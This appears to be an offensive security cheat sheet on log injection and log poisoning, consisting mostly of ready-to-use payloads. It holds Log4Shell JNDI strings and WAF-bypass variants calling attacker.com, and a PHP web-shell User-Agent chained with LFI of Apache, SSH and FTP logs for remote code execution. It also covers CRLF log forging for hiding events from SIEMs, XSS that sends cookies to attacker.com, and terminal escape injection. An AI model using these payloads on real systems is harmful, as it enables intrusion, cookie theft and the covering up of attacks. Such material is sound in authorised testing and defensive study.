---
id: "log-injection"
title: "Log Injection & Log Poisoning"
type: "technique"
category: "web-application"
subcategory: "injection"
tags: ["log-injection", "log-poisoning", "log4shell", "jndi", "lfi", "rce", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["path-traversal", "el-injection", "command-injection-payloads"]
difficulty: "advanced"
updated: "2026-04-14"
---

# Log Injection & Log Poisoning

## Log4Shell (CVE-2021-44228) — Still Finding Targets
```
# Basic JNDI payloads:
${jndi:ldap://attacker.com/exploit}
${jndi:ldaps://attacker.com/exploit}
${jndi:rmi://attacker.com/exploit}
${jndi:dns://attacker.com}

# WAF bypass variants:
${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/x}
${j${::-n}di:ldap://attacker.com/x}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/x}
${${upper:j}ndi:${upper:l}dap://attacker.com/x}
${${date:j}${date:n}${date:d}${date:i}:${date:l}${date:d}${date:a}${date:p}://attacker.com/x}

# Inject in every header, parameter, and field:
User-Agent: ${jndi:ldap://COLLAB/ua}
X-Forwarded-For: ${jndi:ldap://COLLAB/xff}
Referer: ${jndi:ldap://COLLAB/ref}
Cookie: session=${jndi:ldap://COLLAB/cookie}
```

## Log File Poisoning → RCE (via LFI)
```
# Step 1: Poison the log via User-Agent
User-Agent: <?php system($_GET['cmd']); ?>

# Step 2: Include the poisoned log file via LFI
http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id

# Common log paths:
# Apache: /var/log/apache2/access.log, /var/log/httpd/access_log
# Nginx: /var/log/nginx/access.log
# SSH: /var/log/auth.log
# Mail: /var/log/mail.log
# FTP: /var/log/vsftpd.log

# SSH log poisoning:
ssh '<?php system($_GET["cmd"]); ?>'@target.com
# Then include /var/log/auth.log

# FTP log poisoning:
# Login with username: <?php system($_GET['cmd']); ?>
# Then include /var/log/vsftpd.log

# Proc environ poisoning:
# Set User-Agent to PHP payload, include /proc/self/environ
```

## Log Forging (CRLF in Logs)
```
# Inject fake log entries:
username%0d%0a2026-04-14 12:00:00 INFO admin logged in successfully
input%0aFake log entry injected

# SIEM evasion — inject noise to hide real events:
%0a%0a%0a%0a[repeated to push real entries off screen]
```

## XSS in Log Viewers
```
# If logs are displayed in web UI (Kibana, Splunk, Graylog, admin panels):
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">

# ANSI escape injection (terminal viewers):
\x1b[2J\x1b[1;1H    # Clear screen
\x1b]0;EVIL\x07      # Change terminal title
```

## Where to Find This
- Any Java app using Log4j (virtually all enterprise Java)
- PHP apps with LFI + writable logs
- Admin dashboards displaying logs
- SIEM dashboards (Splunk, ELK/Kibana, Graylog)
- Cloud services logging HTTP headers
- Error pages that reflect and log input

## Tools
- log4j-scan (fullhunt) — automated scanner
- marshalsec — JNDI exploitation framework
- JNDIExploit / JNDI-Injection-Exploit
- Interactsh / Burp Collaborator for OOB detection
- nuclei Log4j templates
